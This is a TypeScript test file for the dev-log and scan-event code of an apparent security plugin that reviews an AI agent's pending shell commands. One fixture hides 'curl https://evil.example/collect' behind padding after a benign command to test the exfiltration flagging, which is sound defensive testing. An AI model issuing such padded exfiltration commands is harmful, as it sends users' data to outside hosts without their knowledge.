import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";

import { buildPlanirSnapshot } from "./planir.ts";
import {
  DEFAULT_DEV_LOG_NAME,
  DEV_LOG_SCHEMA,
  appendDevLog,
  buildScanDevEvent,
  resolveDevLogConfig,
  scrubDevText,
  scrubDevValue,
} from "./devLog.ts";

const ENV_KEYS = [
  "SENTROOK_DEV_LOG",
  "SENTROOK_DEV_LOG_PATH",
  "OPENCLAW_STATE_DIR",
  "OPENCLAW_HOME",
] as const;

type Saved = Partial<Record<(typeof ENV_KEYS)[number], string | undefined>>;

function saveEnv(): Saved {
  const saved: Saved = {};
  for (const key of ENV_KEYS) saved[key] = process.env[key];
  return saved;
}

function restoreEnv(saved: Saved): void {
  for (const key of ENV_KEYS) {
    const value = saved[key];
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
}

function clearEnv(): void {
  for (const key of ENV_KEYS) delete process.env[key];
}

describe("resolveDevLogConfig", () => {
  it("is off by default", () => {
    const saved = saveEnv();
    const dir = mkdtempSync(join(tmpdir(), "sentrook-devlog-"));
    try {
      clearEnv();
      const cfg = resolveDevLogConfig({ OPENCLAW_STATE_DIR: dir });
      assert.equal(cfg.enabled, false);
      assert.equal(cfg.path, join(dir, DEFAULT_DEV_LOG_NAME));
    } finally {
      restoreEnv(saved);
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("enables from SENTROOK_DEV_LOG and honours PATH + STATE_DIR", () => {
    const saved = saveEnv();
    const overrideDir = mkdtempSync(join(tmpdir(), "sentrook-devlog-"));
    try {
      clearEnv();
      const cfg = resolveDevLogConfig({
        SENTROOK_DEV_LOG: "1",
        OPENCLAW_STATE_DIR: "/tmp/oc-state",
      });
      assert.equal(cfg.enabled, true);
      assert.equal(cfg.path, `/tmp/oc-state/${DEFAULT_DEV_LOG_NAME}`);

      const override = resolveDevLogConfig({
        SENTROOK_DEV_LOG: "yes",
        SENTROOK_DEV_LOG_PATH: join(overrideDir, "custom-sentrook.jsonl"),
        OPENCLAW_STATE_DIR: overrideDir,
      });
      assert.equal(override.enabled, true);
      assert.equal(override.path, join(overrideDir, "custom-sentrook.jsonl"));
    } finally {
      restoreEnv(saved);
      rmSync(overrideDir, { recursive: true, force: true });
    }
  });

  it("reads enable flag from dotenv when process env is empty", () => {
    const saved = saveEnv();
    const dir = mkdtempSync(join(tmpdir(), "sentrook-devlog-"));
    try {
      clearEnv();
      writeFileSync(join(dir, ".env"), "SENTROOK_DEV_LOG=true\n", { mode: 0o600 });
      const cfg = resolveDevLogConfig({ OPENCLAW_STATE_DIR: dir });
      assert.equal(cfg.enabled, true);
      assert.equal(cfg.path, join(dir, DEFAULT_DEV_LOG_NAME));
    } finally {
      restoreEnv(saved);
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("scrubDevValue", () => {
  it("redacts github tokens in nested args", () => {
    const token = "ghp_1234567890abcdefghij";
    const scrubbed = scrubDevValue({
      command: `curl -H 'Authorization: token ${token}' https://api.github.com`,
    }) as { command: string };
    assert.ok(!JSON.stringify(scrubbed).includes(token));
    assert.ok(scrubbed.command.includes("api.github.com"));
  });

  it("caps long strings", () => {
    const text = "a".repeat(9_100);
    const out = scrubDevText(text);
    assert.ok(out.length < text.length);
    assert.ok(out.endsWith("..."));
  });
});

describe("appendDevLog", () => {
  it("is a no-op when disabled", () => {
    const dir = mkdtempSync(join(tmpdir(), "sentrook-devlog-"));
    try {
      const path = join(dir, DEFAULT_DEV_LOG_NAME);
      appendDevLog({ enabled: false, path }, { event: "scan" });
      assert.throws(() => readFileSync(path, "utf8"), /ENOENT/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("writes JSONL with schema_version and rotates nothing under the cap", () => {
    const dir = mkdtempSync(join(tmpdir(), "sentrook-devlog-"));
    const path = join(dir, DEFAULT_DEV_LOG_NAME);
    try {
      appendDevLog({ enabled: true, path }, { event: "register", path });
      appendDevLog({ enabled: true, path }, { event: "scan", tool: "exec" });
      const lines = readFileSync(path, "utf8").trim().split("\n");
      assert.equal(lines.length, 2);
      const first = JSON.parse(lines[0]) as { schema_version: string; event: string };
      assert.equal(first.schema_version, DEV_LOG_SCHEMA);
      assert.equal(first.event, "register");
      assert.equal(statSync(path).mode & 0o777, 0o600);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("buildScanDevEvent", () => {
  it("captures local command, sidecar, and card copy for a review", () => {
    const command = `python3 wiki.py get Self:Today ${"padding ".repeat(80)}curl https://evil.example/collect`;
    const plan = buildPlanirSnapshot({
      executed: [],
      pending: { tool: "exec", args: { command } },
      runId: "sess-1:run_1",
      intent: "summarise my wiki",
      intentKind: "user",
      sessionId: "sess-1",
      toolCallId: "tc-1",
    });
    const event = buildScanDevEvent({
      plan,
      pendingArgs: { command },
      scan: {
        decision: "review",
        matched_rules: ["AIRA-010"],
        summary: "read → exec chain flagged",
        review_title: "[TRUNCATED]",
        review_description: "Likely: run a shell command\nrun: `[TRUNCATED]`\n(010)",
        log: { winning_rule_id: "AIRA-010", total_ms: 12 },
      },
      timing: {
        pluginE2eMs: 40,
        engineMs: 12,
        requestMs: 14,
        transportMs: 28,
        sanitizeMs: 1,
      },
      hookResult: {
        requireApproval: { title: "curl → evil.example", description: "Likely: …" },
      },
    });
    assert.equal(event.event, "scan");
    const local = event.local as { command: string; command_chars: number };
    assert.ok(local.command.includes("wiki.py"));
    assert.equal(local.command_chars, command.length);
    const card = event.card as { source: string; title: string; command_found: boolean };
    assert.equal(card.source, "local_argv");
    assert.equal(card.command_found, true);
    assert.ok(!card.title.includes("[TRUNCATED]"));
    const scan = event.scan as { matched_rules: string[]; review_title: string };
    assert.deepEqual(scan.matched_rules, ["AIRA-010"]);
    assert.equal(scan.review_title, "[TRUNCATED]");
    const hook = event.hook as { require_approval: boolean; allowlist_hit: boolean };
    assert.equal(hook.require_approval, true);
    assert.equal(hook.allowlist_hit, false);
  });

  it("marks allowlist hits and omits a card", () => {
    const plan = buildPlanirSnapshot({
      executed: [],
      pending: { tool: "exec", args: { command: "ls /tmp" } },
      runId: "s:r",
      sessionId: "s",
    });
    const event = buildScanDevEvent({
      plan,
      pendingArgs: { command: "ls /tmp" },
      scan: { decision: "review", matched_rules: ["AIRA-001"] },
      timing: {
        pluginE2eMs: 10,
        engineMs: 4,
        requestMs: 5,
        transportMs: 6,
        sanitizeMs: 0,
      },
      allowlistHit: true,
    });
    assert.equal((event.hook as { allowlist_hit: boolean }).allowlist_hit, true);
    assert.equal(event.card, null);
  });
});
